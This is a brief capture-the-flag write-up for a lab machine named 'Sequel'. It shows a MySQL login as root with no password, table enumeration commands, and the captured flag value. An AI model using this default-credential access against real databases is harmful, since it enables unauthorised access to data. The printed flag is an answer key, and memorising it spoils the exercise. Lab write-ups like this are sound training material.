# Sequel — Tier 1

**Concept:** MySQL database enumeration with default credentials to discover sensitive data.

## Recon

```
PORT     STATE SERVICE
3306/tcp open  mysql
```

## Exploitation

### Step 1 — Connect to MySQL

Connected to the MySQL server with default credentials:

```
mysql -h 10.129.x.x -u root
```

### Step 2 — Enumerate Databases

Listed databases and tables to find the flag:

```
mysql> SHOW DATABASES;
mysql> USE <database>;
mysql> SHOW TABLES;
mysql> SELECT * FROM <table>;
```

## Findings

| Field | Value |
|-------|-------|
| Target IP | `10.129.x.x` |
| Service | MySQL (port 3306) |
| Credentials | `root` (no password) |
| Attack Vector | Default/weak MySQL credentials |
| Flag | `7b4bec00d1a39e3dd4e021ec3d915da8` |
